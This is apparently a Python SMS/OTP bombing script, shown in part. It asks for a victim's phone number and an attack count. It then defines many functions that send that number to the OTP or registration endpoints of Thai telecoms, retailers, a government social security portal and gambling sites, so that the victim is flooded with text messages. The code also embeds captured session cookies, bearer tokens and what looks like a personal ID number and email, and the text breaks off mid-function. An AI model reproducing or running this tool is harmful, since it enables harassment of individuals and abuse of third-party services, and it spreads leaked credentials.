from wsgiref.headers import Headers
import requests
import requests,json
import random
import os
import time
import colorama
import platform
import time,os,sys
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread

def cls():
    try:
        os.system("cls")
    except:
        os.system("clear")

def banner():
    bannertop = '''
             \33[0m

███████╗██████╗ ███████╗███████╗
██╔════╝██╔══██╗██╔════╝██╔════╝
█████╗  ██████╔╝█████╗  █████╗  
██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                

    '''
    print(bannertop)

cls()
banner()

phone = input("\033[91m[!]│\033[0mEnter Phone Number : ")
Num = int(input("\033[91m[!]│\033[0mEnter Attack Number : "))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
def api1():	 
    requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api2():
    requests.post("https://www.shopat24.com/register/ajax/requestotp/")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api3():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api4():
    requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api5():
    head = {
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc",
    "content-type": "application/json; charset=utf-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "accept": "*/*",
    "origin": "https://m.globalhouse.co.th",
    "referer": "https://m.globalhouse.co.th/"
            }
    requests.post("https://api-globalhouse.com/sms/requestOTP",headers=head,json={"phonNumber":phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api6():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api7():
    head = {
            "Host": "www.bigthailand.com",
            "content-length": "136",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "sec-ch-ua-platform": "Android",
            "origin": "https://www.bigthailand.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.bigthailand.com/login",
            "cookie": "_gcl_au=1.1.723820426.1643691945;_ac_au_gt=1643691945634;_asm_uid=653773101;_fbp=fb.1.1643691957383.1644253645;_ac_client_id=653773209.1643691970;au_id=653773209;_asm_visitor_type=r;_hjSessionUser_2738378=eyJpZCI6IjI0ZjBjOGNhLTVjZWEtNWE3Ni04OWZkLWUyNGU0MWUzOTlhNiIsImNyZWF0ZWQiOjE2NDM2OTE5NTY4MDYsImV4aXN0aW5nIjp0cnVlfQ==;_gac_UA-165856282-1=1.1644738470.Cj0KCQiArt6PBhCoARIsAMF5waj_hkCe4-BkzDT30pB0B3qwe_xKwd2_LtX7E8DgYtiVeUQuLoUjtU8aAub2EALw_wcB;_gcl_aw=GCL.1645120161.CjwKCAiAgbiQBhAHEiwAuQ6Bkp20RyIPMOeEY-ScfXQ4f3nvC_nShMvJZuI58c7afoEYwoA9aksfBhoCdNMQAvD_BwE;auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..f59OD99kZxkzEkQk4x1EPQ.RiF8qhzt7JieP5hextin0Y9P8V9qPKUCwlm93Tvu3XVKAGvp0LiHjKddlD6vMXJ3M4tVLWCbAzQ865V9v-9c_lP_SjC9HoL9tP0xtBFE3c3NxXKbuBsyMU7lEPTrKPdpk9ZICR43PC4tSE3TCeHFDA.0BpR9DJqgK9iNYAV6YtaCA;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUuY29tIiwibWVkaXVtIjoicmVmZXJyZXIiLCJjYW1wYWlnbiI6IiIs%0D%0AImNvbnRlbnQiOiIiLCJ0ZXJtIjoiIiwidHlwZSI6InJlZmVycmVyIiwidGltZSI6MTY0NTUzNDg1%0D%0ANTM5NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExtTnZiUzF5WldabGNuSmxjaTB0TVRZME5UVXpORGcx%0D%0ATlRNNU5RPT0ifQ%3D%3D;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1645534855%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;cdp_session=1;_ga=GA1.2.856661019.1643691948;_gid=GA1.2.60066855.1645534859;popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-02-22T13%3A31%3A00.469Z%22%7D;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6IjBhZTZjOGRlLTQ0YzAtNDA0OS1hNjU4LTZmMjE1MzIyMjg1NyIsImNyZWF0ZWQiOjE2NDU1MzQ4NzE1NjIsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjCachedUserAttributes=eyJhdHRyaWJ1dGVzIjp7fSwidXNlcklkIjoiMjczODM3OCJ9;_ga_80VN88PBVD=GS1.1.1645534855.4.1.1645534873.42;OptanonConsent=isIABGlobal=false&datestamp=Tue+Feb+22+2022+20%3A01%3A14+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=41be2439-a8b7-4bc6-a2ee-4db6f745322a&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1&AwaitingReconsent=false;_pk_id.564990563.2c0e=653773209.1643691945.4.1645534877.1645534855.;_ac_an_session=znzmzgzlzrznzrzmzqznzdzjzdzizlznzmzmzgznzrzkzkzdzizdzizlznzmzmzgznzrzkzkzdzizlznzmzmzgznzrzkzkzdzizdzgzjzizdzjzd2h25zdzgzdzezizd"
            }
    requests.post("https://www.bigthailand.com/authentication-service/user/OTP",headers=head,json={"locale":"th","phone":f"+66{phone[1:]}","email":"gtav2@gmail.com","userParams":{"buyerName":"aimbot god","activateLink":"www.google.com"}})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api8():
    requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api9():
    requests.post("https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":5,"country_code":"TH"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api10():
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api11():
    requests.post('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone)
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api12():
    requests.post('https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp',json={"mobile_phone_no":phone},headers={'user-agent':'Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api13():
    requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api14():
    requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api15():
    requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api16():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api17():
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
        }
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api18():
    requests.post("http://b226.com/x/code", data={f"phone":phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api19():
    requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone}) 
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api20():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api21():
    requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))
    
def api23():	 
    requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api22():	 
    requests.post("https://th.kerryexpress.com/website-api/api/member/v1/Identity",date={"mobileNo":phone})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api24():
    requests.post("https://www.shopat24.com/register/ajax/requestotp/")
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api25():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api26():
    requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
    print(f" \033[95m PHONE \033[1;96m{phone} \033[1;93mRUN CODE \033[1;91m" + str(random.randint(1000,9999)))

def api27():
    head = {
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc",
    "content-type": "application/json; charset=utf-8",
